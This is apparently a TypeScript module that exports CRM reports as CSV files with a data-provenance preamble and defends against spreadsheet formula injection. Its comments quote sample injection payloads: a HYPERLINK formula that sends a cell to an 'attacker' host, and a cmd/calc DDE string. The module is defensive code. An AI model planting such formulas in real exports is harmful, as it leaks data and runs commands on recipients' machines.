import type { ReportRun } from './runner';
// The label the UI shows for a NULL dimension. Imported rather than re-spelled
// so a CSV and the screen cannot disagree about what that row is called.
import { UNATTRIBUTED } from './runner';

/**
 * CSV EXPORT — P3 Phase 7.
 *
 * ─── WHY THE DISCLOSURE IS IN THE FILE ────────────────────────────────────
 *
 * ReportsPage carried this note for the whole time export was disabled, and it
 * is the design brief for this module:
 *
 *   "writing those into a file the user keeps is worse than showing them on
 *    screen: on screen they are surrounded by context, in a spreadsheet they
 *    become someone's evidence."
 *
 * The figures are real now, so export is legitimate — but the context does not
 * come with them unless it is written into the file. A CSV of 15 seeded rows,
 * mailed to a manager, is indistinguishable from a CSV of 15 real ones. So the
 * preamble carries the same sentence the screen shows, and it goes ABOVE the
 * data for the same reason `ProvenanceNote` renders above the table: a reader
 * who stops early must still have been told.
 *
 * The cost is that this is not a bare data rectangle — a naive parser pointed at
 * it will read the preamble as rows. That is a deliberate trade and worth
 * stating out loud: a file that is slightly awkward to machine-parse is a much
 * smaller problem than a file that misrepresents what it contains.
 */

/** RFC 4180: separator, quote, CR and LF are the characters that need quoting. */
const NEEDS_QUOTING = /[",\r\n]/;

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than
 * text. This is CSV injection, and it is a real exploit path here rather than a
 * theoretical one: deal names, company names and sources are all user-supplied
 * and all reachable as dimension values.
 *
 * `=HYPERLINK("http://attacker/?x="&A1,"Q3 numbers")` in a deal name becomes a
 * clickable link that exfiltrates the neighbouring cell when the recipient
 * clicks it, and `=WEBSERVICE(...)` in older Excel fetches without a click. The
 * attacker does not need access to the victim's workspace — they need one
 * record whose name reaches a report someone exports, which in a shared CRM is
 * a low bar.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Neutralise a formula lead-in by prefixing an apostrophe, which spreadsheets
 * read as "the rest is text" and do not display as part of the value.
 *
 * NEGATIVE NUMBERS ARE EXEMPTED ON PURPOSE. `-500` starts with a dangerous
 * character and is also the single most likely legitimate value in a revenue
 * report; prefixing it makes the cell text, which silently breaks every SUM the
 * recipient writes over the column. So a value that parses as a finite number
 * is left alone — `-1+1+cmd|' /C calc'!A0`, the actual attack shape, is NaN and
 * is still neutralised.
 */
function neutraliseFormula(s: string): string {
  if (!FORMULA_LEAD.test(s)) return s;
  if (s.trim() !== '' && Number.isFinite(Number(s))) return s;
  return `'${s}`;
}

/** One cell, escaped for RFC 4180 and made inert for spreadsheets. */
export function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const raw = String(value);
  const safe = neutraliseFormula(raw);
  return NEEDS_QUOTING.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}

const row = (cells: unknown[]): string => cells.map(escapeCell).join(',');

export interface CsvMeta {
  reportName: string;
  /** ISO string; supplied by the caller so the value is testable. */
  generatedAt: string;
  /** The structural caveat, for a canned report that has one. */
  caveat?: string | null;
}

export function toCsv(run: ReportRun, meta: CsvMeta): string {
  const p = run.provenance;
  const lines: string[] = [];

  // ── Preamble: what this is, and what it is made of ──────────────────────
  lines.push(row(['Report', meta.reportName]));
  lines.push(row(['Generated', meta.generatedAt]));
  if (meta.caveat) lines.push(row(['About this report', meta.caveat]));

  // The SAME sentence the screen shows, composed once server-side.
  lines.push(row(['Data note', p.disclosure]));

  // The figures behind the sentence, so a reader can check it rather than
  // taking it on trust.
  lines.push(row(['Rows behind these figures', p.rows_matched]));
  lines.push(row([
    'Seeded demo rows',
    p.rows_seeded === null ? 'not recorded for this module' : p.rows_seeded,
  ]));
  for (const c of p.coverage) {
    lines.push(row([
      `${c.label} ${c.kind === 'join' ? 'linked' : 'recorded'}`,
      `${c.matched} of ${c.of}`,
    ]));
  }
  if (p.currencies && p.currencies.length > 1) {
    lines.push(row([
      'Currencies',
      `${p.currencies.join(', ')} — added without conversion, totals are not meaningful as money`,
    ]));
  }
  if (p.truncated) {
    // Stated in its own row as well as inside the sentence: a truncated export
    // that looks complete is the worst artefact this feature could produce.
    lines.push(row(['TRUNCATED', `Only the first ${p.row_limit} rows are included. There are more.`]));
  }

  // Blank separator so a spreadsheet shows the table as its own block.
  lines.push('');

  // ── The data ────────────────────────────────────────────────────────────
  lines.push(row(run.columns.map(c => c.label)));

  let dims = 0, metrics = 0;
  const keys = run.columns.map(c => (c.kind === 'dimension' ? `dim_${dims++}` : `metric_${metrics++}`));

  for (const r of run.rows) {
    lines.push(row(run.columns.map((c, i) => {
      const v = r[keys[i]];
      // A null DIMENSION is a bucket and is named, exactly as on screen. A null
      // METRIC is a genuine absence and stays empty — writing "Not recorded"
      // there would claim something about data collection that is not true.
      if (v === null || v === undefined) return c.kind === 'dimension' ? UNATTRIBUTED : '';
      return v;
    })));
  }

  // Trailing newline: POSIX text convention, and some parsers drop the last
  // record without it.
  return lines.join('\r\n') + '\r\n';
}

/** A filesystem-safe name that still says which report and when. */
export function csvFilename(reportName: string, generatedAt: string): string {
  const slug = reportName.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') || 'report';
  return `${slug}-${generatedAt.slice(0, 10)}.csv`;
}
